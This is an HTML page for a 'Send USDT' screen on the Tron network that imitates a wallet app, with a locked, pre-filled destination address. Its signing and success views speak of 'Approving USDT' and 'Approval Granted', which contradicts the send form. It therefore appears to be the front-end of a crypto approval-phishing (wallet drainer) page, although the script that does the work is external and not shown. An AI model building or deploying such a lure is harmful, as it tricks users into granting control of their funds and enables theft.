<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"/>
  <meta name="theme-color" content="#141414"/>
  <title>Send USDT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"/>
</head>
<body>

<div id="boot" class="boot"><div class="boot-ring"></div></div>

<!-- CONNECTING -->
<div id="vConn" class="page" hidden>
  <div class="center-wrap">
    <div class="spin-lg"></div>
    <p class="conn-text" id="connText">Connecting wallet…</p>
  </div>
</div>

<!-- SEND USDT -->
<div id="vSend" class="page send-page" hidden>
  <div class="send-header">
    <span></span>
    <h1 class="send-title">Send USDT</h1>
    <span></span>
  </div>

  <div class="send-body">

    <div class="field-block">
      <p class="field-lbl">Address or Domain Name</p>
      <div class="addr-box">
        <span class="addr-txt" id="addrDisplay">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</span>
        <div class="addr-actions">
          <button class="icon-btn" disabled title="Locked">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <rect x="5" y="11" width="14" height="11" rx="2" stroke="#39D98A" stroke-width="2"/>
              <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#39D98A" stroke-width="2" stroke-linecap="round"/>
            </svg>
          </button>
          <button class="icon-btn" id="btnPaste">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <rect x="8" y="3" width="13" height="16" rx="2" stroke="#39D98A" stroke-width="2"/>
              <rect x="3" y="6" width="13" height="16" rx="2" fill="#1c1c1e" stroke="#39D98A" stroke-width="2"/>
            </svg>
          </button>
          <button class="icon-btn">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <rect x="3" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
              <rect x="14" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
              <rect x="3" y="14" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
              <rect x="14" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
              <rect x="18" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
              <rect x="14" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
              <rect x="18" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
            </svg>
          </button>
        </div>
      </div>
    </div>

    <div class="field-block">
      <p class="field-lbl">Destination network</p>
      <div class="net-chip">
        <div class="tron-icon-wrap">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <circle cx="9" cy="9" r="9" fill="#EF0027"/>
            <path d="M5 7h8M9 7v5" stroke="white" stroke-width="1.6" stroke-linecap="round"/>
          </svg>
        </div>
        <span class="net-name">Tron</span>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
          <path d="M6 9l6 6 6-6" stroke="#8E8E93" stroke-width="2" stroke-linecap="round"/>
        </svg>
      </div>
    </div>

    <div class="field-block">
      <p class="field-lbl">Amount</p>
      <div class="amount-box">
        <input id="amtInput" class="amt-input" type="number" inputmode="decimal"
               placeholder="USDT Amount" min="0" step="any"/>
        <div class="amt-right">
          <span class="amt-currency">USDT</span>
          <button id="btnMax" class="max-btn" type="button">Max</button>
        </div>
      </div>
      <p class="usd-eq" id="usdEq">≈ $0.00</p>
    </div>

    <div class="field-block">
      <p class="field-lbl">Memo</p>
      <div class="memo-box">
        <input id="memoInput" class="memo-input" type="text" placeholder=""/>
        <div class="memo-icons">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
            <rect x="3" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
            <rect x="14" y="3" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
            <rect x="3" y="14" width="7" height="7" rx="1" stroke="#39D98A" stroke-width="1.8"/>
            <rect x="14" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
            <rect x="18" y="14" width="3" height="3" fill="#39D98A" rx="0.5"/>
            <rect x="14" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
            <rect x="18" y="18" width="3" height="3" fill="#39D98A" rx="0.5"/>
          </svg>
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="9" stroke="#39D98A" stroke-width="1.8"/>
            <path d="M12 8h.01M12 12v4" stroke="#39D98A" stroke-width="1.8" stroke-linecap="round"/>
          </svg>
        </div>
      </div>
    </div>

    <p id="sendErr" class="send-err" hidden></p>
  </div>

  <div class="send-footer">
    <button id="btnNext" class="btn-next" type="button">Next</button>
  </div>
</div>

<!-- SIGNING -->
<div id="vSign" class="page" hidden>
    <div class="center-wrap">
      <div class="spin-lg"></div>
      <p class="conn-text">Approving USDT…</p>
      <p class="conn-sub">Confirm in Trust Wallet</p>
    </div>
</div>

<!-- SUCCESS -->
<div id="vOk" class="page" hidden>
    <div class="center-wrap">
      <div class="result-icon ok-icon">
        <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
          <path d="M5 12l5 5L19 7" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <p class="result-title">Approval Granted!</p>
      <p class="result-sub" id="txidTxt"></p>
      <button id="btnAgain" class="btn-next" style="margin-top:28px">Done</button>
    </div>
</div>

<!-- ERROR -->
<div id="vErr" class="page" hidden>
  <div class="center-wrap">
    <div class="result-icon err-icon">
      <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
        <path d="M18 6L6 18M6 6l12 12" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
      </svg>
    </div>
    <p class="result-title">Failed</p>
    <p class="result-sub" id="errMsg"></p>
    <button id="btnRetry" class="btn-next" style="margin-top:28px">Try Again</button>
  </div>
</div>

<script type="module" src="/src/main.js"></script>
</body>
</html>
